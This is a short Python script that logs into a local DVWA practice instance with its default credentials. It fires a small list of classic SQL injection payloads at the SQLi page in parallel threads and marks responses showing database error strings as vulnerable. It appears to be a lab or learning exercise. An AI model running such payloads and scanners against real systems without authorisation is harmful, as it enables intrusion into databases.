import requests
import threading
import time

login_url = "http://localhost/dvwa/login.php"
target_url = "http://localhost/dvwa/vulnerabilities/sqli/?id="

username = "admin"
password = "password"

payloads = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "';--"
]

errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax"
]

session = requests.Session()

# login function
def login():
    print("Logging into DVWA...")

    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    session.post(login_url, data=data)
    print("Login successful\n")

# scan function
def scan(payload):
    try:
        url = target_url + payload
        response = session.get(url)

        result = "[TESTED]"

        for error in errors:
            if error.lower() in response.text.lower():
                result = "[VULNERABLE]"
                break

        print(f"{result} Payload: {payload}")

        # SAVE EVERY RESULT
        with open("sql_scan_report.txt", "a") as file:
            file.write(f"{result} Payload: {payload}\n")

        time.sleep(1)

    except Exception as e:
        print("Connection failed:", e)

# start scan
def start_scan():
    threads = []

    print("Starting SQL Injection Scan...\n")

    # clear previous report
    open("sql_scan_report.txt", "w").close()

    for payload in payloads:
        t = threading.Thread(target=scan, args=(payload,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\nScan Completed.")
    print("Results saved in sql_scan_report.txt")

login()
start_scan()